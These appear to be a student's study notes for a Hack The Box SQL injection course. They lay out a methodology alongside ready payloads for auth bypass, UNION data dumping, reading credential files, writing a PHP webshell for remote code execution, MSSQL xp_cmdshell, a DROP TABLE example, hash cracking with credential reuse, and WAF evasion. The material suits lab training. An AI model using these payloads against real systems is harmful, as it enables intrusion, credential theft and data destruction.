# SQL Injection Fundamentals — CPTS Notes

SQLi feels like chaos because it's a **toolbox**, not a straight script. This note fixes that: the **methodology (the fork)** comes first, so you always know which tool to reach for. Then the full reference organized by the HTB module sections, worked examples, a section on **how to adapt any payload to your target**, and a few extras. 

When to use manual SQLi or SQLMAP?

1. MANUAL: inject '  → confirm it breaks

2. MANUAL: find break-out + column count (understand the query)

3. SQLMAP: feed the request → let it dump everything

4. MANUAL again: if sqlmap gets WAF-blocked → hand-craft a bypass, or use --tamper

---

# PART 1 — THE METHODOLOGY (the map that kills the "wtf loop")

Always this order. You never memorize all payloads at once — you just follow the fork.

```
0. FIND input  →  1. BREAK it  →  2. CAN I SEE OUTPUT?  →  3. pick branch by GOAL  →  4. loot
```

## Phase 0 — Find every input

Any place your text reaches the database:

- login fields, search boxes, URL params (`?id=1`)
- hidden spots: POST body, cookies, headers, and things like an **invitation code** field

Rule: if a form doesn't look injectable, **intercept it in Burp** and read the raw request — the real input is often hidden there (this is exactly what the skills assessment needed).

## Phase 1 — Break it (confirm SQLi exists)

Inject a single quote `'` and watch the page:

| You see | Meaning |
|---------|---------|
| SQL error / page breaks | injectable (error-based likely possible) |
| page changes but no error | maybe blind |
| nothing changes | try `' OR '1'='1`, else move on |

## Phase 2 — Ask ONE question: can I see output on the page?

This single fork decides everything:

| Answer | Branch |
|--------|--------|
| Yes, data prints on the page | In-Band → use **UNION** |
| Only SQL errors print | Error-Based |
| No output at all | Blind → Boolean (`AND 1=1` vs `AND 1=2`) or Time (`SLEEP(5)`) |

## Phase 3 — Pick your branch by your GOAL

Goal: log in / bypass auth (login forms):

```
admin' OR '1'='1-- -
```

(if there's a bracket in the query, close it: `admin')-- -`)

Goal: steal data (search/listing pages) → UNION, always 4 steps (full detail in Part 6).

## Phase 4 — Enumerate the DB (always the same ladder)

```
databases  → SCHEMATA

tables     → TABLES where table_schema='X'

columns    → COLUMNS where table_name='Y'

data       → select those columns from X.Y
```

## Phase 5 — Go for RCE (if FILE privilege allows)

```
read files  → LOAD_FILE()   → read config.php for creds

write files → INTO OUTFILE  → drop a PHP webshell → RCE
```

## The two questions that route everything

1. **Where does my input land?** (find it — Burp if hidden)
2. **Can I see output?** (Yes = UNION, No = Blind)

Answer those two and you're always on the right branch.

---

# PART 2 — Database basics + MySQL commands

- A **database** holds **tables**; a table has **rows** and **columns**.
- The relationship/layout of tables is called a **Schema**.
- **NoSQL** doesn't mean "no unique ID" — it means the data doesn't have to follow the traditional relational table structure.
- `INFORMATION_SCHEMA` = a built-in database holding **metadata** (what databases, tables, columns exist). Your map during injection.
- To reach a table in another database: `database.table` (e.g. `SELECT * FROM my_database.users;`).

## General

| Command | Description |
|---------|-------------|
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Login. Leave `-p` **empty** so it prompts — avoids the password landing in `.bash_history` in cleartext |
| `SHOW DATABASES;` | List available databases |
| `USE users;` | Switch to a database |

## Tables

| Command | Description |
|---------|-------------|
| `CREATE TABLE logins (id INT, ...);` | Add a new table |
| `SHOW TABLES;` | List tables in the current database |
| `DESCRIBE logins;` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1, ..);` | Add a row (all columns) |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..);` | Add values to specific columns |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>;` | Update rows |

## Columns

| Command | Description |
|---------|-------------|
| `SELECT * FROM table_name;` | Show all columns |
| `SELECT column1, column2 FROM table_name;` | Show specific columns |
| `DROP TABLE logins;` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT;` | Add a column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;` | Rename a column |
| `ALTER TABLE logins MODIFY oldColumn DATE;` | Change a column's datatype |
| `ALTER TABLE logins DROP oldColumn;` | Delete a column |

## Output

| Command | Description |
|---------|-------------|
| `SELECT * FROM logins ORDER BY column_1;` | Sort by a column |
| `SELECT * FROM logins ORDER BY column_1 DESC;` | Sort descending |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC;` | Sort by two columns |
| `SELECT * FROM logins LIMIT 2;` | First two results |
| `SELECT * FROM logins LIMIT 1, 2;` | `LIMIT offset, count` → skip 1, show 2 |
| `SELECT * FROM table_name WHERE <condition>;` | Rows meeting a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%';` | `%` = any number of chars, `_` = exactly one char |

## MySQL operator precedence (what runs first)

Top = evaluated first:

| Level | Operators                                                      |
| ----- | -------------------------------------------------------------- |
| 1     | Division `/`, Multiply `*`, Modulus `%`                        |
| 2     | Add `+`, Subtract `-`                                          |
| 3     | Comparison `=`, `>`, `<`, `>=`, `<=`, `!=`, `LIKE`             |
| 4     | NOT `!` (also written `!=`) → "the condition must NOT be true" |
| 5     | AND `&&`                                                       |
| 6     | OR `\|\|`                                                      |

Why it matters: `AND` is evaluated **before** `OR`. That's the whole trick behind `... OR id=5` style bypasses.

---

# PART 3 — The types of SQL injection + how your input merges

| Type | Sub-type | How you read the result |
|------|----------|-------------------------|
| **In-Band** | Union-Based | `UNION` combines your query with the original; result prints on the page |
| In-Band | Error-Based | You force a SQL/PHP error that leaks DB info on the page |
| **Blind** | Boolean-Based | Make a condition TRUE/FALSE; the page's response difference reveals the answer |
| Blind | Time-Based | `SLEEP()` delays the response when TRUE; the delay is your signal |
| **Out-of-Band** | — | Result is sent to an external location (e.g. a DNS server) and retrieved there |

In-band = easiest (you see output). Blind = slower, char by char. OOB = when you can't see output AND timing is unreliable.

## How your input merges into the query (the core idea)

The app normally builds:

```
SELECT * FROM logins WHERE username LIKE '%USER_INPUT%';
```

If your input is:

```
1'; DROP TABLE users;--
```

the app glues it in:

```
SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users;--%';
```

What each piece did:

- `'` closes the original SQL string
- `;` ends the first statement
- `DROP TABLE users;` becomes a **new** statement
- `--` starts a comment, so the leftover `%';` is ignored

Note: in some cases you must use the **URL-encoded** version of the payload — e.g. when the payload goes directly in the URL (an HTTP GET request).

---

# PART 4 — Auth bypass (HTB Section 9: Subverting Query Logic + Section 10: Using Comments)

The logic: the app checks `WHERE username='X' AND password='Y'`. You make the whole `WHERE` return TRUE.

Keep the truth table in mind: **AND** needs both sides true; **OR** needs only one side true. So `OR '1'='1'` forces TRUE. For OR-based bypass, the goal is to make the final `WHERE` return TRUE so login succeeds. If the username part makes the query fail, move the `OR` into the password field instead.

| Payload                         | Use                                                          |
| ------------------------------- | ------------------------------------------------------------ |
| `admin' or '1'='1`              | Basic auth bypass                                            |
| `admin')--` → use `admin')-- -` | Auth bypass when the condition uses brackets (add the space) |

## Section 9 assessment (the exact thing that happened)

- `tom' OR '1'='1` → logged you in, but **as admin** (not tom), because it returned the first matching row.
- To log in **as tom specifically**: `tom' OR '1'='1-- -`

## The comment rule (trips everyone up)

Two dashes alone is NOT enough to start a comment in MySQL — there must be an **empty space after** them. So the comment is `-- ` (dash dash space). To make the space visible/safe we write `-- -` (add another dash). In a URL the space is encoded, so it's often `--+`.

| Comment | Where it works |
|---------|----------------|
| `-- -` | Standard (the trailing `-` makes the required space visible) |
| `--+` | In a **URL** (`+` = encoded space) |
| `#` | Works in the query. But in a browser URL `#` is read as a tag → use `%23` (encoded `#`) |
| `/* */` | Inline comment (also handy for WAF bypass) |

## Section 10 assessment (comment out the password check)

Suppose the query is:

```sql
SELECT * FROM logins WHERE username='admin' AND password='something';
```

You want the row for user id 5. Multiple conditions are read as `WHERE (username='admin' OR id=5) AND password...`. So:

```
' OR id=5)#
```

This closes the username with `'`, makes `id=5` true, and comments out the rest with `#`.

---

# PART 5 — How to ADAPT a payload to YOUR target (the skill that matters most)

A walkthrough's payload looks different from yours because **a payload is a template**: fixed bones + swappable parts. Learn the parts once and you can modify any payload.

## Every SQLi payload = 4 pieces

| Piece | What it does | Where its value comes from |
|-------|--------------|----------------------------|
| 1. **Break-out** | closes the original query so your code runs | `'`  `"`  `')`  `")`  or nothing — you **test** to find it |
| 2. **Your logic** | `OR '1'='1`, `UNION SELECT ...`, `AND SLEEP(5)` | your goal (bypass / dump / blind) |
| 3. **Columns + position** | column count + which column prints | YOU find these with `order by` and `UNION select 1,2,3` |
| 4. **Comment** | kills the leftover original query | `-- -` or `%23` |

## How to find the break-out (piece 1 — the part people guess wrong)

```
inject  '    → error?  → single-quote string context  → close with '

inject  "    → error?  → double-quote context         → close with "

error mentions unclosed ) → add a bracket:  ')   or   ")

numeric field, no error on ' → numeric context → no quote, just  OR 1=1
```

## The rule

Copy the **skeleton** from any walkthrough (break-out + logic + comment), but **fill the swappable parts from YOUR own testing** — your quote style, your column count, your visible column, your names. That is "modifying the payload."

---

# PART 6 — UNION injection + column counting (HTB Section 11-12: Union Clause)

Rules:

- `UNION` only joins `SELECT`s with the **same number of columns**. If uneven, pad with junk (a number) to even them out.
- Column **data types** must line up, or you get an error. If you only want one real column, pad the rest: `username, 2`.
- You **cannot** place your injection in the first position if its output isn't printed — find which column actually shows.

Example of padding: `products` has 2 columns, so UNION needs 2:

```
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords-- '
```

## Union Injection — the 4 steps (always the same)

Detecting columns: start `order by 1`, then `2`, then `3`... until it errors or shows no output. If `order by 4` fails, the table has **3 columns**. Then find which column prints to the page — that's where your injection goes (not the first position).

| Step | Payload | What it tells you |
|------|---------|-------------------|
| 1. Count columns | `' order by 1-- -` then 2, 3... until it breaks | last working number = column count |
| 2. Find visible column | `cn' UNION select 1,2,3-- -` (or `cn') UNION select 1,2,3-- -` with brackets) | which number appears = where to put data |
| 3. Fingerprint / version | `cn' UNION select 1,@@version,3,4-- -` | put the injection in the number that printed (here, 2); 3 and 4 also print, so you can use those too |
| 4. Enumerate + dump | pull from `INFORMATION_SCHEMA` / target tables | the loot (Part 7) |

Quick confirm injectability: inject a single `'` in the URL and watch for an error.

---

# PART 7 — DB enumeration (HTB Section 13) + privileges

Fingerprint the DBMS first — each one speaks differently (Part 9). MySQL quick fingerprint:

```
SELECT SLEEP(5);
```

(a delay = MySQL family.) Then walk `INFORMATION_SCHEMA` top-down. A general metadata query:

```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

asks "what databases exist?". Similarly `INFORMATION_SCHEMA.TABLES` for tables.

| Goal                              | Payload (put injection in the visible column)                                                                    |
| --------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| Fingerprint with output           | `SELECT SLEEP(5)`                                                                                                |
| Current database (no output case) | `admin') UNION select 1,2,database(),4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                     |
| List all databases                | `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                        |
| List tables in a DB               | `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -` |
| List columns in a table           | `admin') UNION select 1,2,password,username from ilfreight.Users #`                                              |
| Dump data from another DB         | `cn' UNION select 1,username,password,4 from dev.credentials-- -`                                                |
| 4-column dump shortcut            | `UNION select username,2,3,4 from passwords-- -`                                                                 |

## Privileges (do I have FILE access for RCE?)

`privilege_type = FILE` means your DB user can **read files** (`LOAD_FILE`) and **write files** (`INTO OUTFILE`) on the server → the RCE path is open.

| Goal                   | Payload                                                                                                                                 |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| Current user           | `cn' UNION SELECT 1,user(),3,4-- -`                                                                                                     |
| Am I admin (root)?     | `cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -`                                                               |
| List all my privileges | `cn' UNION SELECT 1,grantee,privilege_type,is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` |

---

# PART 8 — Reading & writing files (toward RCE) (HTB Section 15: Writing Files)

## Read files — `LOAD_FILE()` (from the "Question Answer" part)

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

Common files to check under `/var/www/html` (hunt for DB creds):

- `config.php` → configuration, likely DB connection details
- `db.php` / `database.php` / `connection.php` → DB connection code
- `index.php` → main app code
- `login.php` → login logic
- `search.php` → the search page
- `admin.php` → admin functionality
- `.env` → environment variables / secrets
- `README` / `README.md` → app info
- `robots.txt` → paths the site may hide

## Write files — need 3 things

1. User with **FILE** privilege enabled.
2. MySQL global **`secure_file_priv`** NOT enabled (empty = no restriction).
3. **Write access** to the target folder on the back-end server.

MySQL's default allowed folder is `/var/lib/mysql-files`.

| Step                      | Payload / URL                                                                                                                              | What it does                                      |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------- |
| 1. Read a local file      | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | reads a file from the DB server                   |
| 2. Read app source        | `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`                                                                      | understand how the app works                      |
| 3. Check secure_file_priv | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | **blank** = no restriction                        |
| 4. Test writing           | `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`                                           | no error = probably wrote                         |
| 5. Confirm                | visit `http://TARGET/proof.txt`                                                                                                            | if the text shows, the webroot is writable        |
| 6. Write the webshell     | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | PHP file that runs commands via the `0` parameter |
| 7. Access the shell       | `http://TARGET/shell.php?0=ls` or `0=ls%20/`                                                                                               | RCE                                               |


## Finding the webroot (when writing to `/var/www/html` is denied)

You may get "permission denied" writing to the web root — the app's root folder often isn't writable.

- **`/var/www`** = a normal folder.
- **`/var/www/html`** = usually the **webroot** (the folder the web server exposes to browsers).

Flow: `MySQL Server → INTO OUTFILE → path must exist + MySQL must have permission`.

Find the webroot by reading the server config with `LOAD_FILE`:

| Server | Config path / grep |
|--------|--------------------|
| Apache | `/etc/apache2/apache2.conf` → `grep -R "DocumentRoot" /etc/apache2/` |
| Nginx | `/etc/nginx/nginx.conf` → `grep -R "root " /etc/nginx/` |
| IIS (Windows) | `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` |

If configs fail: **fuzz** common webroots (SecLists `default-web-root-directory-linux.txt` / `-windows.txt`) by trying to write to each, or read server error messages that leak the path.

---

# PART 9 — Other databases (the module only taught MySQL — CPTS mixes them)

Same methodology; only the **syntax** changes. Fingerprint, then adjust.

| Thing | MySQL | MSSQL | PostgreSQL | Oracle |
|-------|-------|-------|------------|--------|
| Version | `@@version` | `@@version` | `version()` | `SELECT banner FROM v$version` |
| Comment | `-- -`, `#` | `--`, `/* */` | `--` | `--` |
| String concat | `CONCAT(a,b)` | `a + b` | `a \|\| b` | `a \|\| b` |
| Current user | `user()` | `SYSTEM_USER` | `current_user` | `SELECT user FROM dual` |
| List tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Stacked queries (`;`) | usually NO (via web) | **YES** | YES | limited |
| Time delay | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_lock.sleep(5)` |

MSSQL supporting **stacked queries** is huge — it lets you run `; EXEC xp_cmdshell 'whoami'` for direct RCE.

## What to do when FILE is missing (don't stop)

No FILE privilege = no file read/write RCE — but that's a bonus, not the goal. You can't switch DB users inside the injection (you're stuck as the app's DB account); you only "become another user" by looting their creds and logging in separately. So route back to extraction:

| Priority | Do this                                               | Command(s)                                                                                                      |
| -------- | ----------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| 1        | **Dump the data** (UNION — no FILE needed)            | list DBs: `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                             |
|          |                                                       | list tables: `cn' UNION select 1,TABLE_NAME,3,4 from INFORMATION_SCHEMA.TABLES where table_schema='DBNAME'-- -` |
|          |                                                       | list columns: `cn' UNION select 1,COLUMN_NAME,3,4 from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -` |
|          |                                                       | dump it: `cn' UNION select 1,username,password,4 from DBNAME.users-- -`                                         |
| 2        | **Crack + reuse the loot**                            | crack: `hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt` (mode depends on hash type)                   |
|          |                                                       | reuse (SSH): `ssh looted_user@TARGET`                                                                           |
|          |                                                       | reuse (Windows): `nxc smb TARGET -u looted_user -p 'looted_pass'`                                               |
| 3        | **Hunt a stronger DB user's creds**                   | dump DB user hashes: `cn' UNION select 1,user,authentication_string,4 from mysql.user-- -`                      |
|          |                                                       | then log into the DB directly (if port reachable): `mysql -u root -p -h TARGET`                                 |
| 4        | **Switch technique** if UNION is limited              | error-based: `cn' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -`                                     |
|          |                                                       | blind (time): `admin' AND IF(1=1,SLEEP(5),0)-- -`                                                               |


Swap placeholders with YOUR values: `cn'` → your break-out, `3,4` → your column positions, `DBNAME` / `users` / `username,password` → what your enumeration found.

Note on priority 3: logging into the DB directly only works if port **3306 is reachable to you** — often it's bound to localhost on the web server. Check first with `nmap -p3306 TARGET`.


---

# PART 10 — Blind, error-based, and WAF bypass (rounding out the types)

## Error-based extraction (MySQL) — output hidden but errors show

```
cn' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -
```

```
cn' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
```

`0x7e` is a `~` to make the leaked value easy to spot. Works on MySQL 5.1 and newer.

## Blind SQLi (when NOTHING prints)

Boolean (watch for a page difference):

```
admin' AND 1=1-- -      (page normal = TRUE)
```

```
admin' AND 1=2-- -      (page different/empty = FALSE)
```

Time-based (watch for the delay):

```
admin' AND IF(1=1,SLEEP(5),0)-- -
```

Extract one char at a time (this is the slow grind your sqlmap chapter automates):

```
admin' AND IF(SUBSTRING((SELECT database()),1,1)='i',SLEEP(5),0)-- -
```

## Filter / WAF bypass basics

| Blocked | Try |
|---------|-----|
| spaces | `/**/`, or `%09` (tab), `%0a` (newline) |
| keyword `UNION` | case mix `UnIoN`, or `UNION/**/SELECT` |
| quotes | hex: `0x61646d696e` instead of `'admin'` |
| `=` | use `LIKE` |
| word stripped once | double it: `UNIUNIONON` |

## URL-encoding reminder (GET / browser)

In a URL, encode specials: space = `%20` (or `+`), `#` = `%23`, `&` = `%26`, `'` = `%27`, `+` = `%2b`.

---

# PART 11 — Skills Assessment (SQL Injection Fundamentals)

The assessment had **no obvious injectable field** — that's the lesson. The path:

| Step | What to do |
|------|------------|
| 1 | Can't log in, no visible injection point → go to **create account / register** |
| 2 | Submit the registration while **intercepting in Burp** |
| 3 | The real injectable input is the **invitation code** in the POST body (Phase 0 — hidden input) |
| 4 | Inject there to bypass the check and get in |

Maps straight to the methodology: Phase 0 (find hidden input via Burp) → Phase 1 (break it) → Phase 3 (bypass logic). It felt random only because the input was hidden; the flow was the same.

Walkthrough reference: [Skills Assessment — SQL Injection Fundamentals [NEW Version] | by 0xlucien | Medium](https://medium.com/@0xlucien/skills-assessment-sql-injection-fundamentals-new-version-c65c99b0f6b1) 

---


